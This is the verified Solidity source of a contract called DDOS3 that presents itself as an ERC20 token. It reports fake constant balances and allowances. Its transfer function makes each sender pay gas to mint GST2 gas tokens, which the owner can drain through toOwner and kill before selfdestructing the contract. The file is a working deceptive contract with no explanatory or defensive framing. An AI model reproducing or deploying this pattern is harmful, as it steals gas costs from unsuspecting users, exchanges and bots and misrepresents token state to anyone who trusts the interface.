/**
 *Submitted for verification at Etherscan.io on 2020-06-21
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Imint {
  function mint(uint256 value) external;
  function transfer(address recipient, uint256 amount) external returns (bool);
  function balanceOf(address owner) external returns (uint256);
}

abstract contract ERC20Base is IERC20 {

  function totalSupply() public view override returns(uint256) {
    return 1000000000000000000000;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return 1000000000000000000000;
  }

  function allowance(address owner, address spender) public view override returns (uint256) {
    return 1000000000000000000000;
  }

  function approve(address spender, uint256 amount) public override returns (bool) {
    emit Approval(msg.sender, spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    emit Transfer(sender, recipient, amount);
    return true;
  }
}

contract DDOS3 is ERC20Base {
  string constant public name = "DDOS3";
  string constant public symbol = "DDOS3";
  uint8 constant public decimals = 2;
  Imint public constant gst2 = Imint(0x0000000000b3F879cb30FE243b4Dfee438691c04);
  address private _owner;

  constructor () public {
    _owner = tx.origin;
  }

  function transfer(address recipient, uint256 amount) public override returns (bool) {
    gst2.mint(amount);
    emit Transfer(msg.sender, recipient, amount);
    return true;
  }

  function toOwner(uint256 amount) public{
    gst2.transfer(_owner,amount);
  }

  function to(address recipient) public returns (bool){
    emit Transfer(msg.sender, recipient, 1);
  }
  
  function kill() public{
    require(_owner == msg.sender);
    uint256 all = gst2.balanceOf(address(this));
    toOwner(all);
    selfdestruct(msg.sender);
  }
}